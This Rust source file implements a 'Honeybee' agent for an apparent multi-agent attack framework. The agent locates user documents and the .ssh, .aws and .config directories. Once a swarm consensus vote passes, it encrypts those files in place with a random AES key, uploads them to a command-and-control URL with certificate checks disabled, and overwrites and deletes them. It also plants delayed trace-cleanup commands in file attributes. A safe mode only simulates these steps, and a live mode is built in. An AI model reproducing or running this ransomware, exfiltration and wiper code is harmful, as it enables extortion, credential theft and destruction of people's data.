use hive_base::{AgentIdentity, ConsensusEngine, HiveChamber, Message, Payload, Role, Decision};
use std::path::PathBuf;
use std::time::Duration;
use tokio::time;
use tracing::{info, warn};
use uuid::Uuid;
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use rand::Rng;

#[derive(Debug, Clone, PartialEq)]
enum HoarderState { Idle, WaitingForConsensus, Executing, Complete }

struct HoarderAgent {
    comms: HiveChamber,
    identity: AgentIdentity,
    consensus: ConsensusEngine,
    state: HoarderState,
    active_proposals: Vec<Uuid>,
    heartbeat_interval: Duration,
    target_paths: Vec<PathBuf>,
    encryption_key: Option<Vec<u8>>,
    safe_mode: bool,
    throttle_ms: u64,
}

impl HoarderAgent {
    async fn new() -> Self {
        let identity = AgentIdentity::new();
        let comms = HiveChamber::connect(&identity, Role::Honeybee)
            .await
            .expect("Failed to connect to colmena arena");

        let cfg = hive_base::config::HiveConfig::load();
        let safe_mode = cfg.exploits.safe_mode;
        if safe_mode {
            info!("Honeybee: SAFE MODE active — actions will be simulated");
        } else {
            info!("Honeybee: LIVE mode — real encryption/exfil/destroy enabled");
        }

        Self {
            comms, identity,
            consensus: ConsensusEngine::new(cfg.consensus.hoarder_threshold),
            state: HoarderState::Idle,
            active_proposals: Vec::new(),
            heartbeat_interval: Duration::from_secs(cfg.timing.heartbeat_interval_secs),
            target_paths: Self::discover_targets(),
            encryption_key: None,
            safe_mode,
            throttle_ms: 100,
        }
    }

    fn discover_targets() -> Vec<PathBuf> {
        let mut targets = Vec::new();
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());

        // Common valuable directories
        for dir in &["Documents", "Desktop", "Downloads", ".ssh", ".aws", ".config"] {
            let path = PathBuf::from(&home).join(dir);
            if path.exists() {
                targets.push(path);
            }
        }

        // Mount points with data
        for mp in &["/mnt", "/media", "/var/lib"] {
            if PathBuf::from(mp).exists() {
                targets.push(PathBuf::from(mp));
            }
        }

        targets
    }

    async fn publish_msg(&self, msg: Message) {
        self.comms.publish(msg).await;
    }

    async fn send_heartbeat(&self) {
        self.comms.send_heartbeat().await;
    }

    // ── Real encryption (AES-256-GCM) ────────────────────────────────────

    fn encrypt_file(&self, path: &PathBuf, key: &[u8; 32]) -> Result<u64, String> {
        let data = std::fs::read(path)
            .map_err(|e| format!("read {}: {}", path.display(), e))?;
        let original_size = data.len() as u64;

        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
        let nonce_bytes: [u8; 12] = rand::thread_rng().gen();
        let nonce = Nonce::from_slice(&nonce_bytes);

        let ciphertext = cipher.encrypt(nonce, data.as_slice())
            .map_err(|e| format!("encrypt {}: {}", path.display(), e))?;

        // Write: nonce (12) + ciphertext
        let mut output = Vec::with_capacity(12 + ciphertext.len());
        output.extend_from_slice(&nonce_bytes);
        output.extend_from_slice(&ciphertext);

        std::fs::write(path, &output)
            .map_err(|e| format!("write {}: {}", path.display(), e))?;

        Ok(original_size)
    }

    fn secure_delete_file(&self, path: &PathBuf) -> Result<u64, String> {
        let metadata = std::fs::metadata(path)
            .map_err(|e| format!("stat {}: {}", path.display(), e))?;
        let size = metadata.len();

        // Overwrite 3 passes with random data, then zeros
        for _ in 0..3 {
            let random: Vec<u8> = (0..size).map(|_| rand::thread_rng().gen()).collect();
            std::fs::write(path, &random)
                .map_err(|e| format!("overwrite {}: {}", path.display(), e))?;
            std::fs::File::open(path)
                .and_then(|f| f.sync_all())
                .map_err(|e| format!("sync {}: {}", path.display(), e))?;
        }

        std::fs::write(path, vec![0u8; size.min(4096) as usize])
            .map_err(|e| format!("zero {}: {}", path.display(), e))?;

        std::fs::remove_file(path)
            .map_err(|e| format!("delete {}: {}", path.display(), e))?;

        Ok(size)
    }

    // ── Real action execution ────────────────────────────────────────────

    async fn execute_encrypt(&mut self) {
        if self.safe_mode {
            info!("Honeybee: SAFE MODE — encrypt simulated ({} paths)", self.target_paths.len());
            let msg = Message::belief(self.identity.id(), Role::Honeybee,
                "encrypt_result".into(), hive_base::Value::String("simulated (safe_mode)".into()), 1.0);
            self.publish_msg(msg).await;
            return;
        }
        if self.encryption_key.is_none() {
            let key: [u8; 32] = rand::thread_rng().gen();
            self.encryption_key = Some(key.to_vec());
            info!("Generated AES-256 encryption key");
        }

        let key: &[u8; 32] = self.encryption_key.as_ref()
            .unwrap().as_slice().try_into().unwrap();

        let mut encrypted = 0u64;
        let mut failed = 0u64;

        for path in &self.target_paths {
            if path.is_file() {
                match self.encrypt_file(path, key) {
                    Ok(bytes) => {
                        info!("Encrypted: {} ({} bytes)", path.display(), bytes);
                        encrypted += bytes;
                        tokio::time::sleep(Duration::from_millis(self.throttle_ms)).await;
                    }
                    Err(e) => {
                        warn!("Encrypt failed for {}: {}", path.display(), e);
                        failed += 1;
                    }
                }
            } else if path.is_dir() {
                if let Ok(entries) = std::fs::read_dir(path) {
                    for entry in entries.filter_map(|e| e.ok()) {
                        let p = entry.path();
                        if p.is_file() {
                            match self.encrypt_file(&p, key) {
                                Ok(bytes) => {
                                    info!("Encrypted: {} ({} bytes)", p.display(), bytes);
                                    encrypted += bytes;
                                }
                                Err(e) => {
                                    warn!("Encrypt failed: {}", e);
                                    failed += 1;
                                }
                            }
                        }
                    }
                }
            }
        }

        let msg = Message::belief(
            self.identity.id(), Role::Honeybee,
            "encrypt_result".into(),
            hive_base::Value::String(format!("encrypted={},failed={}", encrypted, failed)),
            1.0,
        );
        self.publish_msg(msg).await;
    }

    async fn execute_exfiltrate(&self) {
        if self.safe_mode {
            info!("Honeybee: SAFE MODE — exfil simulated");
            return;
        }
        let mut total_bytes = 0u64;

        // Chrononaut: plant time capsules before exfil
        let _ = self.plant_chrononaut_capsules();

        for path in &self.target_paths {
            if path.is_file() && path.metadata().map(|m| m.len()).unwrap_or(0) < 10_000_000 {
                if let Ok(data) = std::fs::read(path) {
                    let c2_url = std::env::var("HIVE_C2_URL")
                        .unwrap_or_else(|_| "https://c2.swarm.local/collect".into());

                    let client = reqwest::Client::builder()
                        .timeout(Duration::from_secs(30))
                        .danger_accept_invalid_certs(true)
                        .build();

                    if let Ok(client) = client {
                        let filename = path.file_name()
                            .map(|n| n.to_string_lossy().to_string())
                            .unwrap_or_else(|| "data".into());

                        match client.post(&c2_url)
                            .header("X-File-Name", &filename)
                            .body(data)
                            .send()
                            .await
                        {
                            Ok(resp) => {
                                if resp.status().is_success() {
                                    total_bytes += resp.content_length().unwrap_or(0);
                                    info!("Exfiltrated: {} ({} bytes)", path.display(),
                                        path.metadata().map(|m| m.len()).unwrap_or(0));
                                } else {
                                    warn!("C2 rejected: {} (HTTP {})", path.display(), resp.status());
                                }
                            }
                            Err(e) => {
                                warn!("C2 unreachable for {}: {}", path.display(), e);
                            }
                        }
                    }
                }
            }
        }

        let msg = Message::belief(
            self.identity.id(), Role::Honeybee,
            "exfil_result".into(),
            hive_base::Value::Int(total_bytes as i64),
            1.0,
        );
        self.publish_msg(msg).await;
    }

    async fn execute_destroy(&mut self) {
        if self.safe_mode {
            info!("Honeybee: SAFE MODE — destroy simulated ({} paths)", self.target_paths.len());
            return;
        }
        let mut deleted = 0u64;
        let mut failed = 0u64;

        for path in &self.target_paths {
            if path.is_file() {
                match self.secure_delete_file(path) {
                    Ok(bytes) => {
                        info!("Destroyed: {} ({} bytes)", path.display(), bytes);
                        deleted += bytes;
                    }
                    Err(e) => {
                        warn!("Destroy failed for {}: {}", path.display(), e);
                        failed += 1;
                    }
                }
            }
        }

        let msg = Message::belief(
            self.identity.id(), Role::Honeybee,
            "destroy_result".into(),
            hive_base::Value::String(format!("deleted={},failed={}", deleted, failed)),
            1.0,
        );
        self.publish_msg(msg).await;
    }

    // ── Event loop ───────────────────────────────────────────────────────

    /// Plant chrononaut time capsules before exfiltration
    async fn plant_chrononaut_capsules(&self) -> Result<(), String> {
        let delayed_commands = vec![
            "reconnect_c2",
            "rotate_keys",
            "trigger_backup",
            "cleanup_traces",
        ];

        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);

        // Plant capsules into log files with future trigger times
        for (i, cmd) in delayed_commands.iter().enumerate() {
            // Find a target file to encode the capsule in
            if let Some(path) = self.target_paths.iter().find(|p| {
                p.extension().and_then(|e| e.to_str()) == Some("log")
            }) {
                let capsule = hive_base::chrononaut::TimeCapsule {
                    capsule_id: Uuid::new_v4(),
                    trigger_timestamp: now + 3600 * (i as u64 + 1), // 1-4 hours later
                    command: cmd.to_string(),
                    payload: vec![],
                    host_hint: "self".into(),
                    executed: false,
                };

                hive_base::chrononaut::Chrononaut::store_in_xattr(path, &capsule)
                    .map_err(|e| format!("chrononaut: {}", e))?;
                info!("Chrononaut: capsule {} planted in {}, trigger in {}h",
                    cmd, path.display(), i + 1);
            }
        }
        Ok(())
    }

    async fn process_incoming(&mut self) {
        let messages = self.comms.read_new().await;

        for msg in messages {
            self.consensus.process_message(&msg);
            match &msg.payload {
                Payload::Proposal { action, argument: _, proposal_id } => {
                    let action_lower = action.to_lowercase();
                    if action_lower.contains("encrypt") || action_lower.contains("exfiltrate")
                        || action_lower.contains("destroy") || action_lower.contains("ransom")
                    {
                        info!("Action proposal: {} (from {})", action, msg.agent_role);
                        self.active_proposals.push(*proposal_id);
                        let weight = self.consensus.get_reputation(&msg.agent_id);
                        let vote = Message::vote(
                            self.identity.id(), Role::Honeybee,
                            *proposal_id, Decision::Support, weight,
                        );
                        self.publish_msg(vote).await;
                        self.state = HoarderState::WaitingForConsensus;
                    }
                }
                Payload::Belief { asset, value, confidence } => {
                    info!("Belief: {} = {:?} ({})", asset, value, confidence);
                }
                Payload::StatusEvent { event_type, subject_id, .. } if event_type == "agent_dead" => {
                    warn!("Agent {} reported DEAD", subject_id);
                }
                _ => {}
            }

            for pid in self.active_proposals.clone() {
                if let Some((reached, ratio, total)) = self.consensus.check_consensus(&pid) {
                    if reached && self.state == HoarderState::WaitingForConsensus {
                        info!("Consensus reached for {} (ratio: {:.2}, weight: {:.2})",
                            pid, ratio, total);
                        self.state = HoarderState::Executing;

                        // Find the proposal action to determine what to execute
                        if let Some(record) = self.consensus.proposals.get(&pid) {
                            let action = record.action.to_lowercase();
                            info!("Executing: {} (consensus confirmed)", action);

                            if action.contains("encrypt") || action.contains("ransom") {
                                self.execute_encrypt().await;
                            } else if action.contains("exfiltrate") {
                                self.execute_exfiltrate().await;
                            } else if action.contains("destroy") {
                                self.execute_destroy().await;
                            }
                        }
                        self.state = HoarderState::Complete;
                    }
                }
            }
        }
    }

    async fn run(&mut self) {
        info!("Hive Honeybee starting | ID: {} | Targets: {} paths",
            self.identity.id(), self.target_paths.len());
        self.send_heartbeat().await;
        let mut heartbeat_timer = time::interval(self.heartbeat_interval);

        loop {
            tokio::select! {
                _ = heartbeat_timer.tick() => { self.send_heartbeat().await; }
                _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
            }
        }
    }
}

#[tokio::main]
async fn main() {
    hive_base::utils::init_logging("honeybee");
    info!("Initializing Hive Honeybee...");
    let mut hoarder = HoarderAgent::new().await;
    hoarder.run().await;
}
